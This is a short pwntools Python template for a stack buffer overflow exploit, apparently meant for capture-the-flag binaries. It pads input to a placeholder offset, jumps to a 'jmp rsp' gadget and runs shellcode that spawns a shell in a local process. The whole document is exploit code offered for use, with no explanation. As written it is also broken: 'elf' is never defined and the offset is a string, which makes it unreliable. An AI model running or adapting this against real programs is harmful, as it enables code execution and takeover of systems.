from pwn import *

jmp_rsp = next(elf.search(asm('jmp rsp')))
offset = "your offset"

payload = flat(
    'A' * offset,              
    jmp_rsp,             
    asm(shellcraft.sh())
)

p = process("./binary name")

p.send(payload)
p.interactive()